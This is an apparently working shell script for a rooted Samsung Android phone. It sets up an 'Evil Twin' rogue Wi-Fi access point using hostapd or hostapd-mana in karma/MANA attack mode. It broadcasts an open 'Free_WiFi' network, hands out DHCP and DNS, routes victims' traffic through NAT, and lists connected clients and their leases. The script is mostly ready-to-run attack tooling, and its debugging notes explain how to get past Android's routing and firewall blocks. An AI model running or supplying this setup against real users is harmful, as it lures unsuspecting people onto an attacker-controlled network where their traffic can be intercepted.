#!/system/bin/sh
# Evil Twin / Rogue AP setup for MT76x2u USB dongle on SM-G781B
# Tested with: LineageOS 23.2 (Android 16), Kernel #6, Magisk 31.1
#
# Usage: su -c sh /data/adb/service.d/setup-ap.sh [start|stop|status]
#
# Requirements:
#   - MT76 USB adapter on wlan1
#   - WiFi (wlan0) connected to internet
#   - Kali chroot at /data/local/nhsystem/kali-arm64
#
# Key findings from debugging:
#   1. hostapd-mana without WMM causes 80%+ TX failures — use wmm_enabled=1
#      or use standard hostapd with WMM
#   2. Android system dnsmasq (v2.51) sends DHCP replies on the WRONG interface
#      (wlan0 instead of wlan1) — MUST use Kali chroot dnsmasq (v2.93)
#   3. Android policy routing has "from all unreachable" as fallback rule 32000
#      which blocks all forwarded traffic — need explicit rule for 10.0.0.0/24
#   4. tetherctrl_FORWARD chain has DROP-all that must be flushed
#   5. Interface MUST be DOWN before hostapd can switch to AP mode

NH_ROOT="/data/local/nhsystem/kali-arm64"
AP_IFACE="wlan1"
INET_IFACE="wlan0"
AP_IP="10.0.0.1"
AP_NET="10.0.0.0/24"
DHCP_RANGE="10.0.0.10,10.0.0.250,12h"
HOSTAPD_CONF="$NH_ROOT/root/ap.conf"
DNSMASQ_LEASES="$NH_ROOT/tmp/dnsmasq.leases"
DNSMASQ_PID="$NH_ROOT/var/run/dnsmasq-ap.pid"
HOSTAPD_PID="/data/local/tmp/hostapd-ap.pid"

detect_gateway() {
    # Find gateway from ARP table or default route on inet interface
    GW=$(ip route show dev "$INET_IFACE" | grep default | awk '{print $3}')
    if [ -z "$GW" ]; then
        GW=$(ip neigh show dev "$INET_IFACE" | grep -v FAILED | head -1 | awk '{print $1}')
    fi
    echo "$GW"
}

write_hostapd_conf() {
    local ssid="${1:-Free_WiFi}"
    local channel="${2:-6}"
    cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wmm_enabled=1
auth_algs=1
wpa=0
EOF
}

write_hostapd_mana_conf() {
    local ssid="${1:-Free_WiFi}"
    local channel="${2:-6}"
    cat > "$HOSTAPD_CONF" << EOF
interface=$AP_IFACE
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
wmm_enabled=1
auth_algs=1
wpa=0
enable_mana=1
mana_loud=1
EOF
}

start_ap() {
    local ssid="${1:-Free_WiFi}"
    local channel="${2:-6}"
    local use_mana="${3:-0}"

    # Preflight: check wlan1 exists
    if ! ip link show "$AP_IFACE" >/dev/null 2>&1; then
        echo "ERROR: $AP_IFACE not found — plug in MT76 USB adapter"
        exit 1
    fi

    # Preflight: check internet interface
    if ! ip link show "$INET_IFACE" >/dev/null 2>&1; then
        echo "ERROR: $INET_IFACE not found"
        exit 1
    fi

    # Preflight: check chroot
    if [ ! -d "$NH_ROOT/usr/sbin" ]; then
        echo "ERROR: Kali chroot not found at $NH_ROOT"
        exit 1
    fi

    echo "[*] Setting up Evil Twin AP: SSID=$ssid CH=$channel MANA=$use_mana"

    # 1. Stop any running AP
    stop_ap 2>/dev/null

    # 2. Interface DOWN (required for hostapd mode switch)
    ip link set "$AP_IFACE" down
    sleep 1

    # 3. Write hostapd config
    if [ "$use_mana" = "1" ]; then
        write_hostapd_mana_conf "$ssid" "$channel"
        echo "[*] Starting hostapd-mana..."
        chroot "$NH_ROOT" /usr/sbin/hostapd-mana -B "$HOSTAPD_CONF" 2>&1
    else
        write_hostapd_conf "$ssid" "$channel"
        echo "[*] Starting hostapd..."
        chroot "$NH_ROOT" /usr/sbin/hostapd -B "$HOSTAPD_CONF" 2>&1
    fi

    if ! iw dev "$AP_IFACE" info 2>/dev/null | grep -q "type AP"; then
        echo "ERROR: hostapd failed to start AP mode"
        exit 1
    fi

    # Save PID
    pgrep -x hostapd > "$HOSTAPD_PID" 2>/dev/null || \
        pgrep -x hostapd-mana > "$HOSTAPD_PID" 2>/dev/null

    # 4. Set AP IP
    ip addr flush dev "$AP_IFACE"
    ip addr add "$AP_IP/24" dev "$AP_IFACE"

    # 5. Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    # 6. Detect and set default route
    GW=$(detect_gateway)
    if [ -z "$GW" ]; then
        echo "WARNING: No gateway found on $INET_IFACE — NAT won't work"
    else
        ip route del default 2>/dev/null
        ip route add default via "$GW" dev "$INET_IFACE"
        echo "[*] Default route: $GW via $INET_IFACE"
    fi

    # 7. Fix Android policy routing (rule 32000 = unreachable blocks forwarding)
    ip rule del from "$AP_NET" lookup main 2>/dev/null
    ip rule del iif "$AP_IFACE" lookup main 2>/dev/null
    ip rule add from "$AP_NET" lookup main prio 9000
    ip rule add iif "$AP_IFACE" lookup main prio 9001

    # 8. Fix iptables FORWARD chain
    # Flush Android's tetherctrl DROP-all rule
    iptables -F tetherctrl_FORWARD

    # Remove old rules
    iptables -D FORWARD -i "$AP_IFACE" -o "$INET_IFACE" -j ACCEPT 2>/dev/null
    iptables -D FORWARD -i "$INET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null

    # Insert at top of FORWARD chain
    iptables -I FORWARD 1 -i "$AP_IFACE" -o "$INET_IFACE" -j ACCEPT
    iptables -I FORWARD 2 -i "$INET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT

    # 9. NAT (MASQUERADE)
    iptables -t nat -D POSTROUTING -o "$INET_IFACE" -j MASQUERADE 2>/dev/null
    iptables -t nat -A POSTROUTING -o "$INET_IFACE" -j MASQUERADE

    # 10. Start DHCP+DNS — MUST use chroot dnsmasq (system v2.51 sends replies on wrong iface)
    mkdir -p "$NH_ROOT/var/run" "$NH_ROOT/tmp"
    chroot "$NH_ROOT" /usr/sbin/dnsmasq \
        --interface="$AP_IFACE" \
        --bind-interfaces \
        --dhcp-range="$DHCP_RANGE" \
        --dhcp-option=3,"$AP_IP" \
        --dhcp-option=6,"$AP_IP" \
        --server=8.8.8.8 \
        --server=8.8.4.4 \
        --log-dhcp \
        --dhcp-leasefile=/tmp/dnsmasq.leases \
        --pid-file=/var/run/dnsmasq-ap.pid \
        --no-resolv \
        2>&1

    echo "[+] AP running!"
    echo "    SSID: $ssid"
    echo "    Channel: $channel"
    echo "    AP IP: $AP_IP"
    echo "    DHCP: $DHCP_RANGE"
    echo "    Internet via: $INET_IFACE → $GW"
    echo ""
    echo "    Stop with: su -c 'sh $0 stop'"
}

stop_ap() {
    echo "[*] Stopping AP..."

    # Kill hostapd/hostapd-mana
    pkill -x hostapd 2>/dev/null
    pkill -x hostapd-mana 2>/dev/null

    # Kill chroot dnsmasq (not system dnsmasq)
    if [ -f "$DNSMASQ_PID" ]; then
        kill "$(cat "$DNSMASQ_PID")" 2>/dev/null
        rm -f "$DNSMASQ_PID"
    fi
    # Also kill by matching args
    pkill -f "dnsmasq.*interface=$AP_IFACE" 2>/dev/null

    # Clean up IP rules
    ip rule del from "$AP_NET" lookup main 2>/dev/null
    ip rule del iif "$AP_IFACE" lookup main 2>/dev/null

    # Clean up iptables
    iptables -D FORWARD -i "$AP_IFACE" -o "$INET_IFACE" -j ACCEPT 2>/dev/null
    iptables -D FORWARD -i "$INET_IFACE" -o "$AP_IFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null
    iptables -t nat -D POSTROUTING -o "$INET_IFACE" -j MASQUERADE 2>/dev/null

    # Reset interface
    ip addr flush dev "$AP_IFACE" 2>/dev/null
    ip link set "$AP_IFACE" down 2>/dev/null

    echo "[+] AP stopped"
}

show_status() {
    echo "=== AP Status ==="
    echo "Interface: $(iw dev "$AP_IFACE" info 2>&1 | grep -E 'type|ssid|channel' | tr '\n' ' ')"
    echo ""
    echo "hostapd: $(pgrep -ax hostapd 2>/dev/null || pgrep -ax hostapd-mana 2>/dev/null || echo 'not running')"
    echo "dnsmasq: $(pgrep -af "dnsmasq.*$AP_IFACE" 2>/dev/null || echo 'not running')"
    echo ""
    echo "=== Connected Clients ==="
    iw dev "$AP_IFACE" station dump 2>&1 | grep -E "Station|signal|tx failed|connected"
    echo ""
    echo "=== DHCP Leases ==="
    cat "$NH_ROOT/tmp/dnsmasq.leases" 2>/dev/null || echo "none"
    echo ""
    echo "=== Routing ==="
    ip route get 8.8.8.8 from 10.0.0.141 iif "$AP_IFACE" 2>&1
    echo ""
    echo "=== Forwarding Stats ==="
    iptables -L FORWARD -v -n 2>&1 | head -5
}

case "${1:-start}" in
    start)
        start_ap "${2:-Free_WiFi}" "${3:-6}" "${4:-0}"
        ;;
    mana)
        start_ap "${2:-Free_WiFi}" "${3:-6}" "1"
        ;;
    stop)
        stop_ap
        ;;
    status)
        show_status
        ;;
    *)
        echo "Usage: $0 {start|mana|stop|status} [ssid] [channel]"
        echo "  start  — Standard hostapd AP (stable, recommended)"
        echo "  mana   — hostapd-mana AP (karma/MANA attack mode)"
        echo "  stop   — Stop AP and clean up"
        echo "  status — Show AP status"
        exit 1
        ;;
esac
